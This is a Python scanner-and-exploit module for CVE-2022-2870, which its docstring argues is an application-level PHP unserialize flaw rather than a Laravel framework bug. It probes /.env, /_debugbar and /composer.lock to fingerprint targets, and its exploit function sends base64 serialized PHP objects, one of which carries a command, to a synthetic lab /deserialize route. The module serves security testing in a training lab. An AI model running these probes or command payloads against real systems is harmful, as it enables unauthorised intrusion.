#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2022-2870')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
    CVE-2022-2870 — Laravel 5.1 "deserialization" (synthetic app-sink lab)

Summary:
    CVE-2022-2870 (VulDB VDB-206501) is a VulDB community-submitted, GHSA-Unreviewed
    entry filed against "Laravel 5.1". It is NOT a Laravel framework vulnerability:
      - No laravel/framework commit, PR, tag, or advisory references it (GitHub search = 0).
      - GHSA-g4q4-r6rr-r4w2 lists no affected package and no fixed version; Snyk does
        not track it. The CNA is VulDB; NVD scores it 9.8 while VulDB itself scores 4.1.
      - The referenced PoC (beicheng-maker/vulns#2) instructs the reader to write their
        OWN controller calling unserialize($request->input("cmd")) and then ships a POP
        chain over classes that happen to be installed. The unsafe sink is APPLICATION
        code, not framework code — it cannot be remediated by upgrading Laravel.

    Because the CVE names no class, endpoint, or vendor file, generic framework-only
    exploitability is impossible. This module still falls back to version/catalog reporting
    for ordinary Laravel 5.1 targets, but the repo's synthetic lab now adds a deliberately
    app-owned /deserialize route so detection and exploitation can prove the unsafe sink
    honestly.

This module performs lab-scoped active detection only:
 ✔ Identifies Laravel version leaks (HTML, version-leak endpoints, composer.lock)
 ✔ Flags Laravel 5.1.x against the CVE's stated affected range
 ✔ Confirms the repo's synthetic /deserialize app sink when present
"""

import base64
import re
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

LARAVEL_VERSION_PATTERN = re.compile(
    r"Laravel\s*v?(\d+\.\d+\.\d+)", re.IGNORECASE
)

SYNTHETIC_ENDPOINT = "/deserialize"
SYNTHETIC_PROOF = "execution_model=actual PHP unserialize"
MARKER_CLASS = "LvcSyntheticMarker"
COMMAND_CLASS = "LvcSyntheticCommand"
DEFAULT_PARAMS = ["username", "password"]

def _safe_get(sess, url, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None

def _extract_version(text: str):
    if not text:
        return None
    m = LARAVEL_VERSION_PATTERN.search(text)
    return m.group(1) if m else None

def _normalize(v: str):
    try:
        parts = v.split(".")
        parts += ["0"] * (3 - len(parts))
        return tuple(int(p) for p in parts[:3])
    except:
        return None

def _is_vulnerable(version: str):
    """Vulnerable only in Laravel 5.1.x"""
    v = _normalize(version)
    if not v:
        return None
    return _normalize("5.1.0") <= v <= _normalize("5.1.99")


def _php_string(value: str) -> str:
    raw = str(value).encode("utf-8")
    return f's:{len(raw)}:"{value}";'


def _php_object(class_name: str, props: dict[str, str]) -> str:
    body = "".join(_php_string(k) + _php_string(v) for k, v in props.items())
    return f'O:{len(class_name)}:"{class_name}":{len(props)}:{{{body}}}'


def _payload(command: str | None = None) -> str:
    if command:
        serialized = _php_object(COMMAND_CLASS, {"cmd": command})
    else:
        serialized = _php_object(MARKER_CLASS, {"marker": "actual PHP unserialize"})
    return base64.b64encode(serialized.encode("utf-8")).decode("ascii")


def _parse_params(options: dict | None) -> list[str]:
    raw = (options or {}).get("params")
    if raw is None:
        return list(DEFAULT_PARAMS)
    if isinstance(raw, str):
        params = [p.strip() for p in raw.split(",") if p.strip()]
    else:
        params = [str(p).strip() for p in raw if str(p).strip()]
    return params or list(DEFAULT_PARAMS)


def _parse_method(options: dict | None) -> str:
    method = str((options or {}).get("method") or "POST").upper()
    return method if method in {"GET", "POST"} else "POST"


def _send_payload(sess, base: str, method: str, params: list[str], payload: str, timeout=8):
    data = {name: payload for name in params}
    url = base.rstrip("/") + SYNTHETIC_ENDPOINT
    headers = {"Accept": "application/json"}
    if method == "GET":
        return sess.get(url, params=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
    return sess.post(url, data=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)


def _probe_synthetic_sink(sess, base: str):
    try:
        r = _send_payload(sess, base, "POST", ["_lvc_probe"], _payload(), timeout=6)
    except Exception:
        return None
    body = r.text or ""
    try:
        parsed = r.json()
    except Exception:
        parsed = {}
    return {
        "status_code": r.status_code,
        "body": body,
        "json": parsed if isinstance(parsed, dict) else {},
        "marker": SYNTHETIC_PROOF in body,
        "sink": "synthetic-app-unserialize" in body,
        "hardened": bool(parsed.get("hardened")) if isinstance(parsed, dict) else False,
    }

def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2022-2870",
        "vdb_id": "VDB-206501",
        "name": "Laravel 5.1 Deserialization (version-based detection)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "evidence": [],
        "preconditions": ["application-level unserialize() sink"],
        "detection_methods": [],
    }

    # 1) Check main page for Laravel version leak
    main = _safe_get(sess, base)
    if main is not None and main.text:
        ver = _extract_version(main.text)
        if ver:
            result["version"] = ver
            result["detection_methods"].append("version_html")
            result["evidence"].append(f"Laravel version leak: {ver}")

    # 2) Common version leak endpoints
    version_leak_eps = ["/_debugbar", "/_debugbar/assets/javascript", "/.env"]
    if not result["version"]:
        for ep in version_leak_eps:
            r = _safe_get(sess, base + ep)
            if r is None:
                continue
            ver = _extract_version(r.text)
            if ver:
                result["version"] = ver
                result["detection_methods"].append(f"version_leak:{ep}")
                result["evidence"].append(f"Version found at {ep}: {ver}")
                break

    # 3) composer.lock exposure
    if not result["version"]:
        composer = _safe_get(sess, base + "/composer.lock")
        if composer is not None and composer.status_code == 200:
            try:
                data = composer.json()
            except:
                data = None
            if data:
                for pkg in data.get("packages", []):
                    if pkg.get("name") == "laravel/framework":
                        ver = pkg.get("version", "").lstrip("v")
                        if ver:
                            result["version"] = ver
                            result["detection_methods"].append("composer_lock")
                            result["evidence"].append(f"composer.lock version: {ver}")
                            break

    # 4) Lab-owned synthetic sink probe. This is not a framework endpoint; it exists only
    # in the local training lab to model the CVE's required app-level unserialize() sink.
    sink = _probe_synthetic_sink(sess, base)
    if sink and sink["marker"]:
        result["vulnerable"] = True
        result["status"] = "confirmed_vulnerable"
        result["verdict"] = "confirmed_vulnerable"
        result["proof_type"] = "safe_active"
        result["version_status"] = "vulnerable" if result["version"] and _is_vulnerable(result["version"]) else result["version_status"]
        result["detection_methods"].append("synthetic_deserialize_sink")
        result["evidence"].append(
            "Synthetic app-owned /deserialize sink instantiated the marker gadget "
            f"({SYNTHETIC_PROOF})."
        )
        result["artifacts"] = {
            "endpoint": base + SYNTHETIC_ENDPOINT,
            "sink": "synthetic-app-unserialize",
            "hardened": False,
        }
        return result

    if sink and sink["sink"] and sink["hardened"]:
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "safe_sink"
        result["detection_methods"].append("synthetic_deserialize_sink_safe")
        result["evidence"].append(
            "Synthetic /deserialize endpoint is present, but hardened mode uses "
            "unserialize(..., ['allowed_classes' => false]) so the marker gadget is not instantiated."
        )
        result["artifacts"] = {
            "endpoint": base + SYNTHETIC_ENDPOINT,
            "sink": "synthetic-app-unserialize",
            "hardened": True,
        }

    # 5) Version-based catalog fallback for non-lab targets.
    if result["version"]:
        if _is_vulnerable(result["version"]):
            if result["verdict"] == "not_detected":
                result["vulnerable"] = False
                result["status"] = "not_exploitable_refusal"
                result["verdict"] = "not_exploitable_refusal"
                result["proof_type"] = "catalog_version_only"
            result["version_status"] = "catalog_match"
            if result["proof_type"] == "catalog_version_only":
                result["disputed"] = True
                result["evidence"].append(
                    "Laravel 5.1.x matches the CVE's affected range, but actual exposure "
                    "depends on an application-level unserialize() sink that the CVE does not name. "
                    "Classified as a catalog/refusal row, not a confirmed vulnerability detector."
                )
        else:
            result["version_status"] = "not_in_range"
            if result["verdict"] == "not_detected":
                result["status"] = "not_detected"
    else:
        result["version_status"] = "unknown"

    return result


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Exploit the repo's synthetic app-owned unserialize() lab sink.

    This intentionally targets /deserialize and lab-only gadget classes. It proves the
    CVE precondition synthetically; it does not claim a generic Laravel framework route.
    """
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = target_url.rstrip("/")
    method = _parse_method(options)
    params = _parse_params(options)
    payload = _payload(command)
    endpoint = base + SYNTHETIC_ENDPOINT

    try:
        r = _send_payload(sess, base, method, params, payload)
    except Exception as exc:
        return {
            "cve": "CVE-2022-2870",
            "attempted": True,
            "success": False,
            "vuln_class": "rce" if command else "deserialization",
            "evidence": "",
            "detail": f"synthetic /deserialize request failed: {type(exc).__name__}: {exc}",
            "artifacts": {"endpoint": endpoint, "method": method, "params": params},
            "requires": ["synthetic app-owned /deserialize unserialize() sink"],
            "reason": "The module only exploits the local training sink; no generic Laravel framework sink is assumed.",
        }

    body = r.text or ""
    try:
        parsed = r.json()
    except Exception:
        parsed = {}

    command_output = ""
    if isinstance(parsed, dict):
        command_output = str(parsed.get("command_output") or "")

    if command:
        success = bool(command_output.strip()) or "uid=" in body
        evidence = command_output.strip() or body[:500]
        detail = "Synthetic app-level unserialize gadget executed the supplied command." if success else "Command gadget proof was not observed."
    else:
        success = SYNTHETIC_PROOF in body
        evidence = SYNTHETIC_PROOF if success else body[:500]
        detail = "Synthetic app-level unserialize sink instantiated the marker gadget." if success else "Marker gadget proof was not observed."

    return {
        "cve": "CVE-2022-2870",
        "attempted": True,
        "success": success,
        "vuln_class": "rce" if command else "deserialization",
        "evidence": evidence,
        "detail": detail,
        "artifacts": {
            "endpoint": endpoint,
            "method": method,
            "params": params,
            "status_code": r.status_code,
            "synthetic_lab": True,
            "hardened": bool(parsed.get("hardened")) if isinstance(parsed, dict) else None,
            "response_head": body[:500],
        },
        "requires": ["synthetic app-owned /deserialize unserialize() sink"],
        "reason": (
            "CVE-2022-2870 is not treated as a generic Laravel framework exploit. "
            "This proof is intentionally synthetic: the lab adds an application route "
            "that unserializes attacker-controlled parameters."
        ),
    }
